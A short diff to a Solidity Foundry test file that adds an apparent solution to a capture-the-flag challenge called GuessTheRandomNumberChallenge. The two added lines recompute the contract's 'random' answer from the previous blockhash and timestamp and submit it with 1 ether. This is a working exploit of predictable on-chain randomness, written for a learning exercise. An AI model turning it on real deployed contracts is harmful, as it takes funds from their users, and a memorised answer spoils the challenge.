@@ -25,6 +25,8 @@ contract GuessTheRandomNumberChallengeTest is Test {
         // your code
 
         // kaktheplanet
+        uint8 secretData = uint8(uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))));
+        target.guess{value: 1 ether}(secretData);
 
         // end of your code
         vm.stopPrank();
